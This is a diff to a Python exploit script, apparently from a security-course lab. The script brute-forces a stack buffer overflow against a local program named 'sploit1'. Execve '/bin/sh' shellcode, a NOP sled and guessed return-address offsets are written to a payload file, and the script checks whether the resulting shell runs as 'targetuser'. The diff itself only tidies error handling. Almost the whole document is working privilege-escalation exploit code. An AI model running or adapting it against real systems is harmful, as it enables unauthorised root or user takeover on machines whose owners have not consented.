@@ -8,7 +8,7 @@ shellcode = (
     b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 )
 
-stack_start = 0xffffd4cc 
+stack_start = 0xffffd4cc
 ebp_offset = 44
 eip_offset = 48
 
@@ -16,8 +16,8 @@ def run_exploit(payload):
     with open("payload", "wb") as f:
         f.write(payload)
     
-    p = subprocess.Popen(["./sploit1"], stdin=open("payload", "rb"), stdout=subprocess.PIPE)
-    output = p.stdout.read().strip()
+    p = subprocess.Popen(["./sploit1"], stdin=open("payload", "rb"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output, error = p.communicate()
     
     return b"targetuser" in output
 
@@ -27,7 +27,7 @@ def build_payload(nop_length, eip_offset):
     
     padding_length = ebp_offset - len(nop_sled) - len(shellcode)
     if padding_length < 0:
-        raise ValueError("NOP sled and shellcode are too large to fit in the buffer")
+        return None
     
     padding = b"A" * padding_length
     
@@ -36,9 +36,8 @@ def build_payload(nop_length, eip_offset):
 
 for nop_len in range(1, 100):
     for eip_off in range(-500, 500, 4):
-        try:
-            payload = build_payload(nop_len * 4, eip_off)
-        except ValueError:
+        payload = build_payload(nop_len * 4, eip_off)
+        if payload is None:
             continue
         
         if run_exploit(payload):
